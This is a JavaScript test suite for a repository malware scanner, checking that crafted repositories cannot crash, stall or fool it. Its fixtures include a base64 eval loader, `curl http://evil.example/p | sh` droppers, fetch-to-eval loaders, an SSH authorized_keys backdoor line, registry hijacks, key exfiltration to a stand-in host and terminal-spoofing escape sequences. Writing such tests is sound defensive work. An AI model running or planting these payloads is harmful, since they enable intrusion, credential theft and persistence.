// Repositories built to attack the scanner rather than to fool the reader.
//
// The rest of the suite asks whether a rule sees what it should. These ask
// what happens when a repository is written to break the rule itself: a
// manifest shaped to hand the scanner a pattern, a lockfile field that is not
// the type the code assumes, a nesting depth chosen to overflow a walk, a
// token repeated until a pattern backtracks. A repository that can reliably
// produce "no verdict" has switched the scanner off, so each case pairs the
// hostile shape with the honest shape it imitates: a fix that blinds the rule
// fails here just as loudly as the crash it replaced.
import "./helpers.js";
import test from "node:test";
import assert from "node:assert/strict";
import { scanRepo } from "../src/scan.js";
import { checkFile } from "../src/heuristics.js";
import { checkComposerJson, checkVscodeTasks } from "../src/ecosystems.js";
import { renderHuman } from "../src/report.js";
import { FIXED_NOW, makeClient } from "./helpers.js";

const file = (path, content) => ({ path, content, bytes: content.length, lines: content.split("\n").length });
const scan = (files) => scanRepo({ owner: "acme", repo: "take-home", client: makeClient(files), now: FIXED_NOW });
const sev = (findings, id) => findings.find((f) => f.id === id)?.severity ?? "none";

// --- A manifest must never write a pattern the scanner then runs -----------

test("a composer.json script key is never compiled into a regex", async () => {
  // Not a lifecycle event, but it passed an unanchored gate and was then
  // interpolated into `new RegExp`, where its unbalanced paren threw.
  const result = await scan({ "composer.json": '{"scripts":{"pre-install-cmd\\"(":"x"}}' });
  assert.equal(result.verdict, "green");

  // A key that merely contains an event name is not that event.
  assert.deepEqual(checkComposerJson("composer.json", '{"scripts":{"not-pre-install-cmd-really":"x"}}'), []);

  // The real event still convicts, and still reports its line.
  const real = checkComposerJson("composer.json", '{"scripts":{"pre-install-cmd":"curl https://e.example/x | sh"}}');
  assert.equal(sev(real, "composer-install-script"), "high");
  assert.ok(real[0].line >= 1);
});

test("a regex-shaped composer key cannot choose the pattern the scanner runs", async () => {
  // `pre-install-cmd"|(a+)+b` compiles to a catastrophic pattern that then
  // runs against file content the same author controls.
  const content = `{"scripts":{"pre-install-cmd\\"|(a+)+b":"x"},"description":"${"a".repeat(400)}"}`;
  const started = Date.now();
  const result = await scan({ "composer.json": content });
  assert.ok(Date.now() - started < 2000, "a crafted composer key must not cost the scan seconds");
  assert.equal(result.verdict, "green");
});

// --- One broken rule must not cost the whole scan --------------------------

test("a rule that fails on one file still leaves the other files judged", async () => {
  const result = await scanRepo({
    owner: "acme",
    repo: "t",
    now: FIXED_NOW,
    client: {
      fetchRepo: async () => ({
        meta: (await makeClient({}).fetchRepo()).meta,
        tree: [
          { path: "package.json", type: "blob", mode: "100644" },
          { path: "composer.json", type: "blob", mode: "100644" },
        ],
        treeTruncated: false,
        submodules: 0,
        symlinks: 0,
      }),
      fetchFile: async (o, r, ref, path) =>
        path === "package.json"
          ? JSON.stringify({ name: "x", scripts: { postinstall: "curl https://e.example/x | sh" } })
          : '{"scripts":{"pre-install-cmd":"ok"}}',
    },
  });
  assert.equal(result.verdict, "red");
});

// --- Lockfile fields are attacker-written, so they are type-guarded --------

test("a non-string package name in a lockfile does not abort the scan", async () => {
  const result = await scan({
    "package.json": JSON.stringify({ name: "x", version: "1.0.0" }),
    "package-lock.json": '{"lockfileVersion":3,"packages":{"node_modules/a":{"name":5}}}',
  });
  assert.ok(["green", "yellow", "red"].includes(result.verdict));
  // The rule ran rather than being skipped: nothing was reported unexaminable.
  assert.equal(result.notes.some((n) => n.includes("could not be examined")), false);
});

// --- A walk over parsed manifest JSON needs a floor ------------------------

const nest = (open, close, depth, leaf) => open.repeat(depth) + leaf + close.repeat(depth);

test("deeply nested overrides do not overflow the stack", async () => {
  // V8 parses this happily; it was the walk over the result that threw.
  const overrides = `{"name":"x","version":"1.0.0","overrides":${nest('{"a":', "}", 5000, '"1.0.0"')}}`;
  const result = await scan({ "package.json": overrides });
  assert.ok(["green", "yellow", "red"].includes(result.verdict));
});

test("deeply nested lockfile dependencies do not overflow the stack", async () => {
  const lock = `{"lockfileVersion":1,"dependencies":${nest('{"a":{"dependencies":', "}}", 5000, "{}")}}`;
  const result = await scan({ "package.json": '{"name":"x"}', "package-lock.json": lock });
  assert.ok(["green", "yellow", "red"].includes(result.verdict));
});

// --- One small edit must not turn a red repository green -------------------
//
// Each pair below is the same malware twice. Only the way it is declared or
// named changes, so a rule that reads the declaration rather than the
// behaviour fails here.

// Reads a wallet extension by id, executes a decoded blob, and shells out.
const PAYLOAD = `
const b = "Y3VybCBodHRwOi8vZXZpbC5leGFtcGxlL3AgfCBzaA==";
eval(Buffer.from(b, "base64").toString());
const ext = "nkbihfbeogaeaoehlefnkodbefgpgknn";
require("child_process").execSync("curl http://evil.example/p | sh");
`;
const PKG = JSON.stringify({ name: "x", version: "1.0.0" });

test("a licence header does not make authored code a library", async () => {
  assert.equal((await scan({ "package.json": PKG, "src/index.js": PAYLOAD })).verdict, "red");
  for (const banner of ["/*! (c) 2024 Acme */", "// @license MIT", "/* Copyright (c) 2024 */"]) {
    const result = await scan({ "package.json": PKG, "src/index.js": `${banner}\n${PAYLOAD}` });
    assert.equal(result.verdict, "red", `"${banner}" must not downgrade the payload`);
  }
});

test("a real bundle still has its shape signals relaxed", () => {
  // The downgrade exists for this: minifiers pad display strings, and a
  // vendored bundle is where that is ordinary. Behaviour is not relaxed, but
  // character noise is, and that distinction is the whole rule.
  const padded = `const label = "loading${"".repeat(6)}";\n`;
  assert.equal(sev(checkFile(file(".yarn/releases/yarn-1.21.0.js", padded)), "private-use-steganography"), "low");
  assert.equal(sev(checkFile(file("src/index.js", padded)), "private-use-steganography"), "high");
});

test("every dependency field an install resolves is read", async () => {
  const bad = { "evemt-stream": "1.0.0", lodash: "npm:evil-pkg@1.0.0" };
  for (const field of ["dependencies", "devDependencies", "optionalDependencies", "peerDependencies"]) {
    const result = await scan({ "package.json": JSON.stringify({ name: "x", [field]: bad }) });
    assert.equal(result.verdict, "red", `a name hidden in ${field} still installs`);
  }
});

test("a benign registry line above the real one hides nothing", async () => {
  // Plain http: a registry over https at an unknown host is a caution, since
  // the name cannot say whether it is a company mirror or a hijack.
  const hijack = "registry=http://evil.example/\n";
  assert.equal((await scan({ "package.json": PKG, ".npmrc": hijack })).verdict, "red");
  // A scoped entry is unremarkable content for this file, and used to be the
  // only line read.
  const masked = `@types:registry=https://registry.npmjs.org/\n${hijack}`;
  assert.equal((await scan({ "package.json": PKG, ".npmrc": masked })).verdict, "red");
  // An honest file that only pins a scope to the real registry stays clean.
  const honest = "@types:registry=https://registry.npmjs.org/\nregistry=https://registry.npmjs.org/\n";
  assert.equal((await scan({ "package.json": PKG, ".npmrc": honest })).verdict, "green");
});

test("a nested yarnPath above the real one hides nothing", async () => {
  const masked = "npmScopes:\n  acme:\n    yarnPath: .yarn/releases/yarn-4.0.0.cjs\nyarnPath: ./evil.js\n";
  assert.equal((await scan({ "package.json": PKG, ".yarnrc.yml": masked })).verdict, "red");
  const honest = "yarnPath: .yarn/releases/yarn-4.0.0.cjs\n";
  assert.equal((await scan({ "package.json": PKG, ".yarnrc.yml": honest })).verdict, "green");
});

test("renaming a file does not hide what is in it", async () => {
  for (const name of ["src/index.ts", "src/index.mts", "src/index.cts", "src/App.vue", "public/index.html"]) {
    const result = await scan({ "package.json": PKG, [name]: PAYLOAD });
    assert.equal(result.verdict, "red", `${name} must be read`);
  }
});

test("spacing a dropper's halves apart does not silence it", async () => {
  const filler = (n) => {
    let s = "";
    let i = 0;
    while (s.length < n) s += `const setting${i} = { retries: ${i++} };\n`;
    return s.slice(0, n);
  };
  const dropper = (gap) => `const fs = require("fs");
const cp = require("child_process");
${filler(gap)}
const res = await fetch("https://cdn.example/stage2");
fs.writeFileSync("/tmp/.s2", Buffer.from(await res.arrayBuffer()));
fs.chmodSync("/tmp/.s2", 0o755);
${filler(gap)}
cp.execSync("/tmp/.s2");
`;
  // Adjacent, and far apart: the second used to produce nothing at all.
  for (const gap of [0, 400, 900]) {
    const result = await scan({
      "package.json": JSON.stringify({ name: "x", scripts: { postinstall: "node scripts/setup.js" } }),
      "scripts/setup.js": dropper(gap),
    });
    assert.notEqual(result.verdict, "green", `a dropper with ${gap} chars between its halves must not pass`);
  }
});

test("a fetched response handed straight to eval is caught", () => {
  const loader = `const http = require("http");
http.get("http://cdn.example/step2", (res) => {
  let body = "";
  res.on("data", (c) => (body += c));
  res.on("end", () => eval(body));
});
`;
  assert.equal(sev(checkFile(file("scripts/setup.js", loader)), "download-and-execute"), "high");
  // Piping fetched DATA into a program written in the file is the everyday
  // shell idiom for parsing an API response, and is not this.
  const parse =
    'LABELS=$(curl -sS "https://api.github.com/repos/x/y/issues/1/labels" | python3 -c "import sys, json; print(json.load(sys.stdin))")\n';
  assert.equal(sev(checkFile(file("docs/check.sh", parse)), "download-and-execute"), "none");
});

// --- A repository must not be able to write the report -------------------

test("a finding's prose cannot carry escape sequences into the terminal", async () => {
  const ESC = String.fromCharCode(27);
  // Clears the screen, homes the cursor, prints a green verdict over a red
  // scan. `why` interpolates this value straight out of the file.
  const spoof = `${ESC}[2J${ESC}[1;1H${ESC}[32mVerdict: GREEN${ESC}[0m`;
  const result = await scan({ "package.json": PKG, ".yarnrc.yml": `yarnPath: ${spoof}\n` });
  assert.equal(result.verdict, "red");
  assert.equal(renderHuman(result).includes(ESC), false, "no escape byte may reach the report");
});

test("a finding's prose cannot carry 8-bit C1 controls into the terminal either", async () => {
  // U+009B is CSI and U+009D is OSC: the same screen-clearing green headline
  // as the ESC form, with no ESC byte for the C0 strip to see. A terminal in
  // UTF-8 mode that honours C1 controls renders it.
  const CSI = String.fromCharCode(0x9b);
  const OSC = String.fromCharCode(0x9d);
  const spoof = `${CSI}2J${CSI}1;1H${CSI}32mVerdict: GREEN${CSI}0m${OSC}8;;https://x.example${String.fromCharCode(0x9c)}`;
  const result = await scan({ "package.json": PKG, ".yarnrc.yml": `yarnPath: ${spoof}\n` });
  assert.equal(result.verdict, "red");
  assert.equal(/[\u0080-\u009f]/.test(renderHuman(result)), false, "no C1 control may reach the report");
});

test("an install script's body is shown for the script that runs, and redacted", async () => {
  const result = await scan({
    "package.json": JSON.stringify({ name: "x", scripts: { postinstall: "node scripts/setup.js" } }),
    // A decoy whose name is a substring of "scripts/setup.js" used to answer
    // for it, because the old lookup matched on basenames.
    "up.js": "// nothing happens here\n",
    "scripts/setup.js": 'const k = "AKIAIOSFODNN7EXAMPLEAKIAIOSFODNN7EXAMPLEAKIAIOSFODNN7";\nfetch("https://e.example/" + k);\n',
  });
  const lifecycle = result.findings.find((f) => f.id === "lifecycle-script");
  assert.equal(lifecycle.scriptPath, "scripts/setup.js");
  // Redacted like every other excerpt: this travels to the AI provider too.
  assert.ok(lifecycle.scriptBody.includes("redacted"), "a long literal must not survive verbatim");
  // ...but still readable as code, which is the point of showing it.
  assert.ok(lifecycle.scriptBody.includes("\n"));
});

// --- Padding a file must not talk a rule out of its finding ----------------

test("decoys ahead of the real line do not soften a finding", () => {
  // The context guard gave up after 200 matches and reported "all of them
  // were in context", which is the opposite of what running out means.
  const real = 'exec(`echo "${key}" >> ~/.ssh/authorized_keys`);\n';
  const decoys = 'adb shell echo x >> authorized_keys\n'.repeat(250);
  assert.equal(sev(checkFile(file("src/persist.js", real)), "ssh-backdoor"), "high");
  assert.equal(sev(checkFile(file("src/persist.js", decoys + real)), "ssh-backdoor"), "high");
});

test("pip's short index flag redirects packages the same as the long one", () => {
  const long = "--index-url https://evil.example/simple\nrequests\n";
  const short = "-i https://evil.example/simple\nrequests\n";
  assert.equal(sev(checkFile(file("requirements.txt", long)), "requirements-custom-index"), "medium");
  assert.equal(sev(checkFile(file("requirements.txt", short)), "requirements-custom-index"), "medium");
  // The real index is not a redirection.
  assert.equal(sev(checkFile(file("requirements.txt", "-i https://pypi.org/simple\n")), "requirements-custom-index"), "none");
});

test("a VS Code task's payload is read whether it sits in command or args", () => {
  const inCommand = '{"tasks":[{"command":"curl https://e.example/x | sh","runOptions":{"runOn":"folderOpen"}}]}';
  const inArgs = '{"tasks":[{"command":"sh","args":["-c","curl https://e.example/x | sh"],"runOptions":{"runOn":"folderOpen"}}]}';
  assert.equal(sev(checkVscodeTasks(".vscode/tasks.json", inCommand), "vscode-autorun-task"), "high");
  assert.equal(sev(checkVscodeTasks(".vscode/tasks.json", inArgs), "vscode-autorun-task"), "high");
  // Opening a terminal on folderOpen is a convenience, not a trap.
  const benign = '{"tasks":[{"command":"npm","args":["run","watch"],"runOptions":{"runOn":"folderOpen"}}]}';
  assert.equal(sev(checkVscodeTasks(".vscode/tasks.json", benign), "vscode-autorun-task"), "medium");
});

// --- Repeated tokens must not drive a pattern into backtracking ------------

test("no rule stalls on a file built out of one repeated token", () => {
  // Each string drove one pattern into exponential or quadratic backtracking.
  // The budget is deliberately loose: the failure mode was seconds to
  // minutes, so anything approaching it is still the bug coming back.
  const cases = {
    "index.js": "systemctl enable " + "--a ".repeat(40) + "zzz",
    ".envrc": "https://".repeat(20_000),
    Makefile: "\\".repeat(100_000) + "x",
    "app.js": ("raw.githubusercontent.com/" + "a".repeat(200)).repeat(400),
    ".github/workflows/a.yml": "${{ secrets.".repeat(40_000),
  };
  for (const [path, content] of Object.entries(cases)) {
    const started = Date.now();
    checkFile(file(path, content));
    const ms = Date.now() - started;
    assert.ok(ms < 2000, `${path} took ${ms}ms on a hostile file`);
  }
});
